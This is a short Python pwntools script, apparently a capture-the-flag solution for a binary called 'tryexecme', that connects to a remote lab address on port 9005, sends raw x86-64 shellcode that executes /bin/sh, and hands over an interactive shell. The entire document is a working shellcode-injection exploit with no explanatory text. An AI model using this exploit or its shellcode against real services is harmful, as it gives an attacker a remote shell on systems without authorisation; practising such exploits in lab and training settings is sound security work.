from pwn import *

elf = context.binary = ELF('./tryexecme')
context.log_level = 'debug'

io = remote('10.10.62.83', 9005)

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

io.sendline(shellcode)
io.interactive()